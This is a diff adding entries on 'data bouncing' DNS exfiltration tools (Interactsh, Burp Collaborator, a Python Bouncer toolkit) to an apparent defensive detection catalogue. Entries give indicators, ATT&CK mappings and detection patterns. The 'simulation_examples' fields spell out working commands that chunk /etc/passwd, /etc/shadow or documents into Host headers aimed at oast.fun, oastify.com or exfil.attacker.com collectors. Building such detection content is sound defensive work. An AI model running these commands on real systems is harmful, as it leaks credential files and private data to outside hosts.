@@ -30672,5 +30672,2846 @@
       ],
       "mutexes": []
     }
+  },
+  {
+    "name": "Interactsh (OOB DNS/HTTP collector)",
+    "category": "Data Bouncing",
+    "platform": "Linux / macOS / Windows",
+    "overview": "Open-source out-of-band interaction server by ProjectDiscovery that captures DNS, HTTP, and SMTP callbacks. In a data bouncing context it serves as the exfiltration collector — chunked data encoded in DNS subdomains arrives here after trusted intermediary servers unknowingly perform hostname lookups on attacker-crafted headers. Public hosted instance or self-hosted.",
+    "telemetry_overview": [
+      "DNS query logs (passive DNS / resolver logs)",
+      "Proxy / firewall HTTP logs",
+      "SIEM correlation rules for known OAST domains",
+      "TLS inspection for SNI to known oast.* domains"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "DNS queries to *.oast.pro / *.oast.me / *.oast.live / *.oast.site / *.oast.online / *.oast.fun",
+        "notes": "Any internal host resolving subdomains under these domains is interacting with an Interactsh server — the subdomain itself may contain exfiltrated data chunks."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS requests to oast.* domains on ports 80/443",
+        "notes": "Interactsh captures full HTTP requests including headers and body; exfil data may be embedded in the URL path, query parameters, or headers."
+      },
+      {
+        "source": "Network",
+        "path": "SMTP connections to oast.* domains on port 25",
+        "notes": "Interactsh also listens on SMTP — email-based data bouncing sends chunks as email addresses or message bodies to these domains."
+      },
+      {
+        "source": "Endpoint",
+        "path": "interactsh-client / interactsh-server binary on disk",
+        "notes": "Presence of the Go binary indicates self-hosted infrastructure setup; check for correlation ID generation and polling activity."
+      },
+      {
+        "source": "DFIR",
+        "path": "DNS resolver cache / passive DNS telemetry",
+        "notes": "Historical queries to oast.* domains reveal the timeline and volume of data bouncing activity. Subdomain strings may be decodable to recover exfiltrated content."
+      }
+    ],
+    "network_indicators": [
+      "DNS queries to oast.pro, oast.me, oast.live, oast.site, oast.online, oast.fun, or interact.sh subdomains",
+      "High volume of DNS queries with long, hex- or base64-encoded subdomain labels from a single host",
+      "HTTP requests to diverse trusted domains with Host / X-Forwarded-For / Referer headers containing oast.* subdomains",
+      "Outbound SMTP to oast.* domains from non-mail hosts"
+    ],
+    "staging_behaviors": [
+      "File chunked and encoded (hex or base64) into DNS-label-safe subdomains before transmission",
+      "Encryption (AES/RC4) applied to chunks before encoding into subdomain labels",
+      "Sequence numbering prepended to chunks for reassembly on the collector side",
+      "Temporary working files or encoded payloads staged in /tmp or %TEMP% before the send loop begins"
+    ],
+    "expected_child_processes": [
+      "interactsh-client / interactsh-server (Go binary)",
+      "curl / wget / Invoke-WebRequest (sending crafted HTTP requests to trusted intermediaries)",
+      "python3 / powershell (running bouncer/sender scripts that target the Interactsh listener)",
+      "nslookup / dig / Resolve-DnsName (direct DNS exfil to Interactsh domain as fallback)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "Data is encrypted, chunked into DNS subdomains, and exfiltrated via DNS lookups triggered by trusted third-party web servers — not a direct C2 channel."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The actual data transport occurs via DNS queries — trusted servers perform hostname lookups containing exfil data which reach the Interactsh collector."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "Outbound traffic appears as legitimate HTTP to trusted domains; the exfil payload is hidden in HTTP headers that trigger DNS lookups, morphing TCP web traffic into UDP DNS exfil."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "Trusted third-party web servers act as unwitting proxies — they receive the HTTP request and relay the exfil data via DNS lookup to the attacker's Interactsh server (confused deputy / CWE-441)."
+      }
+    ],
+    "refs": [
+      {
+        "label": "ProjectDiscovery: Interactsh GitHub repository",
+        "url": "https://github.com/projectdiscovery/interactsh",
+        "type": "github"
+      },
+      {
+        "label": "GreyNoise Labs: Weekly OAST Report — Interactsh scanning activity across oast.* domains",
+        "url": "https://www.labs.greynoise.io/grimoire/2026-01-24-weekly-oast-report/",
+        "type": "report"
+      },
+      {
+        "label": "GreyNoise Labs: ColdFusion Christmas Campaign — Interactsh used for exploit validation and OOB exfil",
+        "url": "https://www.labs.greynoise.io/grimoire/2025-12-26-coldfusion/",
+        "type": "report"
+      },
+      {
+        "label": "Darktrace: Post-Exploitation of Ivanti CS/PS — Interactsh and Burp Collaborator used for exploit validation",
+        "url": "https://www.darktrace.com/blog/the-unknown-unknowns-post-exploitation-activities-of-ivanti-cs-ps-appliances",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Identifying Candidates — Interactsh as the primary DNS listener for data bouncing",
+        "url": "https://databouncing.io/exampleone/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Principle — core concept of indirect exfiltration via trusted hostname lookups",
+        "url": "https://databouncing.io/principle/",
+        "type": "report"
+      },
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM queries for Interactsh and other OOB domains",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Register an Interactsh listener and exfiltrate /etc/passwd via data bouncing through a trusted domain",
+        "command": "# Start listener\ninteractsh-client -s oast.fun -v\n# On victim: bounce data through a trusted domain's Host header\nfor chunk in $(cat /etc/passwd | base64 -w0 | fold -w 40); do\n  curl -s -o /dev/null -H \"Host: ${chunk}.YOUR_INTERACTSH_ID.oast.fun\" https://trusted-domain.com\ndone"
+      },
+      {
+        "description": "Use Interactsh web client as collector with N1ckDunn Bouncer for file exfil via data bouncing",
+        "command": "# Register at https://app.interactsh.com\n# Copy your OOB domain, e.g. abc123.oast.fun\npython3 bouncer.py -e abc123.oast.fun -f secret.docx -u 9999 -v"
+      },
+      {
+        "description": "Self-host Interactsh server for persistent collection",
+        "command": "interactsh-server -domain exfil.attacker.com -ip 1.2.3.4\n# Client polls for captured interactions\ninteractsh-client -s exfil.attacker.com -v"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "interactsh-client*",
+        "detect_type": "tool_execution",
+        "purpose": "Interactsh client binary execution — registers with OOB server and polls for captured interactions",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "interactsh-server*",
+        "detect_type": "tool_execution",
+        "purpose": "Self-hosted Interactsh server — attacker running their own DNS/HTTP/SMTP collector",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*oast.fun*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to Interactsh OAST domain in command line, script, or config — indicates active exfil setup",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*oast.pro*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to Interactsh OAST domain in command line, script, or config",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*oast.me*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to Interactsh OAST domain in command line, script, or config",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*oast.live*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to Interactsh OAST domain in command line, script, or config",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*interact.sh*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to interact.sh domain — legacy or custom Interactsh server domain",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-H*Host:*oast.*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header pointing to OAST domain — active data bouncing send",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject an Interactsh subdomain containing exfil data — the trusted destination server may perform a DNS lookup on this hostname, bouncing the data to the attacker's collector."
+          }
+        ]
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "DNS query to *.oast.pro / *.oast.me / *.oast.live / *.oast.site / *.oast.online / *.oast.fun",
+        "detect_type": "exfil_action",
+        "purpose": "Any DNS resolution of an Interactsh subdomain indicates OOB data exfiltration — the subdomain label itself likely contains encoded data chunks",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "DNS queries with encoded subdomain labels > 30 characters to uncommon TLDs",
+        "detect_type": "bulk_transfer_or_staging",
+        "purpose": "Long hex/base64-encoded subdomain labels are characteristic of DNS-based data exfiltration — each query carries a chunk of the exfiltrated file",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing oast.* or interact.sh subdomains",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing in action — legitimate HTTP request carries exfil payload in the Host header; trusted server performs DNS lookup that delivers data to attacker",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "High-frequency HTTP requests to diverse trusted domains from single host in short window",
+        "detect_type": "bulk_transfer_or_staging",
+        "purpose": "Data bouncing sender distributing chunks across many trusted intermediaries — burst of outbound HTTP to varied legitimate destinations",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "SMTP connection to oast.* domain from non-mail server",
+        "detect_type": "exfil_action",
+        "purpose": "Interactsh also captures SMTP — email-based data bouncing variant",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "ProjectDiscovery, Inc."
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443,
+        25
+      ],
+      "mutexes": []
+    },
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration"
+  },
+  {
+    "name": "Burp Collaborator (OOB DNS/HTTP/SMTP collector)",
+    "category": "Data Bouncing",
+    "platform": "Windows / macOS / Linux",
+    "overview": "Commercial out-of-band interaction server built into Burp Suite Pro and Enterprise by PortSwigger. Captures DNS, HTTP, HTTPS, and SMTP callbacks via unique subdomains under oastify.com (current) and burpcollaborator.net (legacy). In a data bouncing context it serves as the exfiltration collector — data-laden DNS queries triggered by trusted intermediary servers are captured and correlated. Self-hostable as a private Collaborator server on any domain. The domain was switched from burpcollaborator.net to oastify.com specifically because defenders were blocking the original.",
+    "telemetry_overview": [
+      "DNS query logs (passive DNS / resolver logs)",
+      "Proxy / firewall HTTP logs",
+      "SIEM correlation rules for oastify.com and burpcollaborator.net domains",
+      "TLS inspection for SNI to oastify.com / burpcollaborator.net"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Network",
+        "path": "DNS queries to *.oastify.com / *.burpcollaborator.net",
+        "notes": "Any internal host resolving subdomains under these domains is interacting with a Burp Collaborator server. Subdomain labels may contain encoded exfil data chunks when used for data bouncing."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP/HTTPS connections to oastify.com or burpcollaborator.net on ports 80/443",
+        "notes": "Collaborator uses valid CA-signed wildcard TLS certificates for its domains. HTTP interactions capture full request including headers and body."
+      },
+      {
+        "source": "Network",
+        "path": "SMTP connections to oastify.com / burpcollaborator.net on port 25/587",
+        "notes": "Collaborator captures SMTP interactions — email-based data bouncing sends data as crafted email addresses or message content."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Burp Suite JAR / process (java -jar burpsuite_pro*.jar)",
+        "notes": "Burp Suite Pro running locally with Collaborator tab active indicates an operator polling for OOB interactions. Private server deployments run the same JAR with --collaborator-server flag."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Collaborator server config file (collaborator.config)",
+        "notes": "Private Collaborator server configuration — contains custom domain, TLS cert paths, and network interface bindings. Presence indicates self-hosted collector infrastructure."
+      },
+      {
+        "source": "DFIR",
+        "path": "Burp project files (*.burp) / Collaborator tab data",
+        "notes": "Burp project files store captured Collaborator interactions including DNS, HTTP, and SMTP payloads with timestamps and correlation IDs."
+      }
+    ],
+    "network_indicators": [
+      "DNS queries to *.oastify.com or *.burpcollaborator.net subdomains from internal hosts",
+      "High volume of DNS queries with long, encoded subdomain labels to oastify.com",
+      "HTTP requests to diverse trusted domains with Host / X-Forwarded-For / Referer headers containing oastify.com subdomains",
+      "Outbound SMTP to oastify.com from non-mail servers",
+      "TLS connections where SNI contains oastify.com or burpcollaborator.net"
+    ],
+    "staging_behaviors": [
+      "File chunked and encoded (hex or base64) into DNS-label-safe subdomains before transmission",
+      "Encryption applied to chunks before encoding into subdomain labels",
+      "Sequence numbering prepended to chunks for reassembly on the Collaborator side",
+      "Collaborator payloads generated and inserted into HTTP headers or URL parameters before sending"
+    ],
+    "expected_child_processes": [
+      "java (Burp Suite Pro JAR — hosts Collaborator client or private server)",
+      "curl / wget / Invoke-WebRequest (sending crafted HTTP requests to trusted intermediaries with Collaborator payloads)",
+      "nslookup / dig / Resolve-DnsName (direct DNS interaction with Collaborator domain)",
+      "python3 / powershell (running bouncer/sender scripts targeting Collaborator listener)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "Data is encrypted, chunked into DNS subdomains, and exfiltrated via DNS lookups triggered by trusted third-party web servers — the Collaborator server collects the bounced data."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The actual data transport occurs via DNS queries — trusted servers perform hostname lookups containing exfil data which reach the Collaborator collector at oastify.com."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "Outbound traffic appears as legitimate HTTP to trusted domains; the exfil payload is hidden in HTTP headers that trigger DNS lookups, morphing TCP web traffic into UDP DNS exfil collected by Collaborator."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "Trusted third-party web servers act as unwitting proxies — they receive the HTTP request and relay the exfil data via DNS lookup to the attacker's Collaborator server (confused deputy / CWE-441)."
+      }
+    ],
+    "refs": [
+      {
+        "label": "PortSwigger: Burp Collaborator documentation",
+        "url": "https://portswigger.net/burp/documentation/desktop/tools/collaborator",
+        "type": "report"
+      },
+      {
+        "label": "PortSwigger: Out-of-Band Application Security Testing (OAST) overview",
+        "url": "https://portswigger.net/burp/application-security-testing/oast",
+        "type": "report"
+      },
+      {
+        "label": "Darktrace: Post-Exploitation of Ivanti CS/PS — Interactsh and Burp Collaborator used for exploit validation",
+        "url": "https://www.darktrace.com/blog/the-unknown-unknowns-post-exploitation-activities-of-ivanti-cs-ps-appliances",
+        "type": "report"
+      },
+      {
+        "label": "SocInvestigation: OAST Detection and Response — SIEM queries for Collaborator and other OOB domains",
+        "url": "https://www.socinvestigation.com/out-of-band-application-security-testing-detection-and-response/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Identifying Candidates — Burp Collaborator as lighter-weight data bouncing collector",
+        "url": "https://databouncing.io/exampleone/",
+        "type": "report"
+      },
+      {
+        "label": "TheContractor.io: Data Bouncing — Collaborator and Taborator referenced as OOB listeners",
+        "url": "https://thecontractor.io/data-bouncing/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Generate Collaborator payload and bounce data through a trusted domain's Host header",
+        "command": "# In Burp Suite Pro > Collaborator tab > Copy payload\n# e.g. payload = abc123.oastify.com\n# On victim: bounce data through trusted domain\nfor chunk in $(cat /etc/shadow | base64 -w0 | fold -w 40); do\n  curl -s -o /dev/null -H \"Host: ${chunk}.abc123.oastify.com\" https://trusted-domain.com\ndone\n# Poll Collaborator tab to see DNS interactions carrying data"
+      },
+      {
+        "description": "Private Collaborator server for persistent collection on custom domain",
+        "command": "# On attacker server:\njava -jar burpsuite_pro.jar --collaborator-server --collaborator-config=collab.config\n# collab.config points to custom domain e.g. exfil.attacker.com\n# Victim-side bouncing targets this custom domain instead of oastify.com"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*burpsuite*.jar*",
+        "detect_type": "tool_execution",
+        "purpose": "Burp Suite JAR execution — may be running Collaborator client or private Collaborator server",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*--collaborator-server*",
+        "detect_type": "tool_execution",
+        "purpose": "Private Burp Collaborator server being launched — attacker self-hosting OOB collection infrastructure",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": [
+          {
+            "argument": "--collaborator-server",
+            "why": "This flag starts Burp Suite in headless Collaborator server mode — the operator is setting up a DNS/HTTP/SMTP collector for out-of-band data exfiltration."
+          }
+        ]
+      },
+      {
+        "pattern": "*oastify.com*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to Burp Collaborator domain in command line, script, or config — active exfil or OOB interaction setup",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*burpcollaborator.net*",
+        "detect_type": "exfil_action",
+        "purpose": "Reference to legacy Burp Collaborator domain — older Burp versions or deliberate use of legacy domain",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "curl*-H*Host:*oastify.com*",
+        "detect_type": "exfil_action",
+        "purpose": "curl with crafted Host header pointing to Collaborator domain — active data bouncing send",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-H Host:",
+            "why": "Overriding the Host header to inject a Collaborator subdomain containing exfil data — the trusted destination server may perform a DNS lookup on this hostname, bouncing the data to the attacker's Collaborator."
+          }
+        ]
+      },
+      {
+        "pattern": "collaborator.config",
+        "detect_type": "tool_configuration",
+        "purpose": "Private Collaborator server configuration file — contains custom domain and TLS setup for self-hosted collector",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "DNS query to *.oastify.com",
+        "detect_type": "exfil_action",
+        "purpose": "DNS resolution of a Burp Collaborator subdomain — the subdomain label likely contains encoded exfil data chunks when used for data bouncing",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "DNS query to *.burpcollaborator.net",
+        "detect_type": "exfil_action",
+        "purpose": "DNS resolution of legacy Burp Collaborator domain — same risk as oastify.com",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP to trusted domains with Host header containing oastify.com subdomains",
+        "detect_type": "exfil_action",
+        "purpose": "Data bouncing in action — legitimate HTTP request carries exfil payload in the Host header; trusted server performs DNS lookup that delivers data to Collaborator",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "TLS connection with SNI containing oastify.com or burpcollaborator.net",
+        "detect_type": "exfil_action",
+        "purpose": "Encrypted connection directly to Collaborator infrastructure — may be polling for results or direct HTTP-based exfil",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "SMTP connection to oastify.com or burpcollaborator.net from non-mail host",
+        "detect_type": "exfil_action",
+        "purpose": "Collaborator captures SMTP — email-based data bouncing variant sending chunks as crafted addresses",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      }
+    ],
+    "signer": [
+      "PortSwigger Ltd"
+    ],
+    "ioc_artifacts": {
+      "user_agents": [],
+      "named_pipes": [],
+      "service_names": [],
+      "scheduled_tasks": [],
+      "destination_ports": [
+        53,
+        80,
+        443,
+        25,
+        587
+      ],
+      "mutexes": []
+    },
+    "related_protocol": "DNS Data Bouncing / Indirect Exfiltration"
+  },
+  {
+    "name": "DataBouncing Bouncer (N1ckDunn Python)",
+    "category": "Data Bouncing",
+    "platform": "Linux / macOS / Windows",
+    "overview": "Python-based data bouncing exfiltration sender from the original DataBouncing PoC toolkit by Nick Dunn. The Bouncer script encrypts a file, chunks it into DNS-label-safe segments with sequence numbers, then sends each chunk embedded as a subdomain in HTTP headers (Host, X-Forwarded-For, Referer) to randomly selected trusted domains. Those trusted servers unknowingly perform DNS lookups on the crafted hostnames, delivering the data to an attacker-controlled DNS listener (typically Interactsh or Burp Collaborator). Works with companion scripts: Recruiter (identifies viable bounce targets), Dentist (extracts usable hosts), and Therapist (reassembles exfiltrated file from DNS logs).",
+    "telemetry_overview": [
+      "Process creation logs (python3 execution)",
+      "Proxy / firewall HTTP logs showing requests with unusual headers",
+      "DNS query logs for encoded subdomain patterns",
+      "Command-line audit logs capturing script arguments"
+    ],
+    "detailed_artifacts": [
+      {
+        "source": "Endpoint",
+        "path": "bouncer.py / recruiter.py / dentist.py / thetherapist.py on disk",
+        "notes": "Presence of any of the four DataBouncing toolkit scripts indicates data bouncing capability. Check for the GitHub clone directory structure."
+      },
+      {
+        "source": "Endpoint",
+        "path": "Python command history / .bash_history / .python_history",
+        "notes": "Look for bouncer.py invocations with -e (exfil domain), -f (file to exfiltrate), and -u (unique ID) flags."
+      },
+      {
+        "source": "Filesystem",
+        "path": "Input target list files (e.g. domains.txt, usable_hosts.txt)",
+        "notes": "Recruiter and Dentist produce lists of trusted domains that will bounce DNS lookups — these files reveal the planned bounce targets."
+      },
+      {
+        "source": "Filesystem",
+        "path": "Interactsh JSON export files used by Dentist and Therapist",
+        "notes": "JSON files from the DNS listener containing captured interactions — Therapist reads these to reassemble the exfiltrated file."
+      },
+      {
+        "source": "Network",
+        "path": "HTTP requests to diverse trusted domains with crafted Host / X-Forwarded-For / Referer headers",
+        "notes": "Bouncer sends HTTP to randomly selected trusted domains; the headers contain attacker-controlled subdomains with encrypted data chunks. The destination is legitimate — the exfil is in the header."
+      },
+      {
+        "source": "DFIR",
+        "path": "DNS resolver cache / passive DNS",
+        "notes": "Queries triggered by trusted servers resolving crafted hostnames from Bouncer. Subdomain labels contain sequence-numbered encrypted chunks that can be decoded to recover the exfiltrated file."
+      }
+    ],
+    "network_indicators": [
+      "Burst of HTTP requests from a single host to many diverse trusted domains in a short time window",
+      "HTTP requests where the Host header domain does not match the actual destination IP/domain",
+      "DNS queries with long hex-encoded subdomain labels containing sequence numbers (e.g. 0001.hexdata.exfil.oast.fun)",
+      "Outbound HTTP to high-reputation domains with anomalous header values that resolve to OOB/OAST infrastructure"
+    ],
+    "staging_behaviors": [
+      "Target file read and encrypted (Fernet/AES) before chunking",
+      "Encrypted payload split into DNS-label-safe chunks with sequence numbers prepended",
+      "Trusted domain target list loaded from Dentist output or manually curated file",
+      "Each chunk paired with a randomly selected trusted domain and header position (Host, X-Forwarded-For, Referer) before the send loop"
+    ],
+    "expected_child_processes": [
+      "python3 bouncer.py (main exfil sender)",
+      "python3 recruiter.py (pre-exfil reconnaissance of bounce-capable domains)",
+      "python3 dentist.py (extraction of usable hosts from Interactsh JSON)",
+      "python3 thetherapist.py (reassembly of exfiltrated file from DNS logs)",
+      "curl / requests library (underlying HTTP engine for sending crafted requests)"
+    ],
+    "attack_mappings": [
+      {
+        "id": "T1048.001",
+        "name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
+        "why": "Bouncer encrypts the file, chunks it, and exfiltrates via DNS lookups triggered by HTTP requests to trusted domains — the data never travels over a direct C2 channel."
+      },
+      {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols",
+        "why": "The first leg of exfiltration is standard HTTP/HTTPS to legitimate trusted domains — the exfil payload is hidden in HTTP headers."
+      },
+      {
+        "id": "T1071.004",
+        "name": "Application Layer Protocol: DNS",
+        "why": "The actual data transport occurs when trusted servers perform DNS lookups on the crafted hostnames in the headers — each lookup delivers a chunk to the attacker's DNS listener."
+      },
+      {
+        "id": "T1001.003",
+        "name": "Data Obfuscation: Protocol Impersonation",
+        "why": "Outbound HTTP traffic appears entirely legitimate going to trusted domains; the exfil data is obfuscated as hostnames in standard HTTP headers, morphing from TCP HTTP into UDP DNS."
+      },
+      {
+        "id": "T1090.002",
+        "name": "Proxy: External Proxy",
+        "why": "Trusted web servers act as unwitting proxies (confused deputy / CWE-441) — they process the HTTP request and trigger DNS resolution that delivers data to the attacker."
+      },
+      {
+        "id": "T1027",
+        "name": "Obfuscated Files or Information",
+        "why": "Bouncer encrypts file contents before chunking and encodes chunks as hex subdomain labels — the exfil data is not readable in transit without the encryption key and reassembly logic."
+      }
+    ],
+    "refs": [
+      {
+        "label": "N1ckDunn: DataBouncing GitHub repository — Bouncer, Recruiter, Dentist, Therapist scripts",
+        "url": "https://github.com/N1ckDunn/DataBouncing",
+        "type": "github"
+      },
+      {
+        "label": "DataBouncing.io: Bouncing with Nick Dunn — walkthrough of the Python toolkit",
+        "url": "https://databouncing.io/nickkitone/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Principle — core concept of indirect exfiltration via trusted hostname lookups",
+        "url": "https://databouncing.io/principle/",
+        "type": "report"
+      },
+      {
+        "label": "TheContractor.io: Data Bouncing — original concept and PoC reference by John and Dave",
+        "url": "https://thecontractor.io/data-bouncing/",
+        "type": "report"
+      },
+      {
+        "label": "DataBouncing.io: Identifying Candidates — Recruiter workflow for finding bounce-capable domains",
+        "url": "https://databouncing.io/exampleone/",
+        "type": "report"
+      }
+    ],
+    "simulation_examples": [
+      {
+        "description": "Exfiltrate a file via data bouncing using Bouncer with an Interactsh listener",
+        "command": "# Clone toolkit\ngit clone https://github.com/N1ckDunn/DataBouncing.git\n# Start Interactsh listener and copy OOB domain\n# Run Bouncer to exfiltrate a file\npython3 bouncer.py -e YOUR_OOB_DOMAIN.oast.fun -f secret.docx -u 5555 -v"
+      },
+      {
+        "description": "Full pipeline: Recruit bounce targets, extract usable hosts, exfiltrate, reassemble",
+        "command": "# 1. Identify which trusted domains will bounce\npython3 recruiter.py -o YOUR_OOB_DOMAIN.oast.fun -f top1000domains.txt -v\n# 2. Extract usable hosts from Interactsh JSON output\npython3 dentist.py interactsh_output.json\n# 3. Exfiltrate file through discovered bounce targets\npython3 bouncer.py -e YOUR_OOB_DOMAIN.oast.fun -f secret.docx -u 5555 -v\n# 4. Reassemble on attacker side from DNS logs\npython3 thetherapist.py -i dns_logs.json -o recovered.docx -u 5555 -v"
+      }
+    ],
+    "endpoint_detection_patterns": [
+      {
+        "pattern": "*bouncer.py*",
+        "detect_type": "tool_execution",
+        "purpose": "DataBouncing Bouncer script execution — primary data exfiltration sender",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": true
+        },
+        "arguments": [
+          {
+            "argument": "-e",
+            "why": "Specifies the exfiltration domain (attacker-controlled DNS listener) where data chunks will be collected after bouncing through trusted intermediaries."
+          },
+          {
+            "argument": "-f",
+            "why": "Specifies the file to exfiltrate — this file will be encrypted, chunked, and sent via data bouncing."
+          },
+          {
+            "argument": "-u",
+            "why": "Unique ID used to correlate and reassemble chunks on the attacker side."
+          }
+        ]
+      },
+      {
+        "pattern": "*recruiter.py*-o*",
+        "detect_type": "tool_execution",
+        "purpose": "DataBouncing Recruiter script — scanning trusted domains to identify which ones will perform hostname lookups (bounce candidates)",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": [
+          {
+            "argument": "-o",
+            "why": "OOB domain used to detect which trusted domains trigger DNS lookups — reconnaissance phase before exfiltration."
+          }
+        ]
+      },
+      {
+        "pattern": "*dentist.py*",
+        "detect_type": "tool_execution",
+        "purpose": "DataBouncing Dentist script — extracts usable bounce target hostnames from Interactsh JSON output",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "*thetherapist.py*",
+        "detect_type": "tool_execution",
+        "purpose": "DataBouncing Therapist script — reassembles and decrypts exfiltrated file from captured DNS logs",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": [
+          {
+            "argument": "-i",
+            "why": "Input JSON file from DNS listener containing captured exfil chunks."
+          },
+          {
+            "argument": "-o",
+            "why": "Output filename for the reassembled exfiltrated file."
+          }
+        ]
+      },
+      {
+        "pattern": "python3*DataBouncing*",
+        "detect_type": "tool_execution",
+        "purpose": "Any execution from the DataBouncing toolkit directory",
+        "detects": {
+          "tool_presence": true,
+          "exfil_action": false
+        },
+        "arguments": []
+      }
+    ],
+    "network_detection_patterns": [
+      {
+        "pattern": "High-frequency HTTP requests to diverse trusted domains from single host in short window",
+        "detect_type": "bulk_transfer_or_staging",
+        "purpose": "Bouncer distributes chunks across many trusted intermediaries — a single host rapidly hitting google.com, apple.com, microsoft.com etc. with crafted headers is characteristic of data bouncing",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
+        "pattern": "HTTP request where Host header domain differs from destination IP / SNI",
+        "detect_type": "exfil_action",
+        "purpose": "Core data bouncing indicator — the Host header contains the exfil subdomain (e.g. chunk.exfil.oast.fun) while the actual connection goes to a trusted domain",
+        "detects": {
+          "tool_presence": false,
+          "exfil_action": true
+        },
+        "arguments": []
+      },
+      {
